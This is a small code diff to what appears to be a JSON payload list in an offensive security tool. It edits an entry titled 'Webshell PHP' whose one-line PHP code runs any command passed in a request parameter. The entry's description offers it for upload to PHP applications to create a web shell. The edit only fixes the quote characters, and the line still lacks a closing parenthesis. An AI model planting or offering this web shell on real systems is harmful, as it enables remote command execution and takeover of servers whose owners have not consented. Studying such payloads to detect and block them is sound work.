@@ -67,7 +67,7 @@
 			{
                 "lname": "Webshell PHP",
 				"qname": "WSPHP",
-				"ctext": "<?php system($_REQUEST[“cmd”]; ?>",
+				"ctext": "<?php system($_REQUEST[\"cmd\"]; ?>",
 				"parms": [],
                 "des": "Can be used in upload with to a php application to create a web shell."
             }
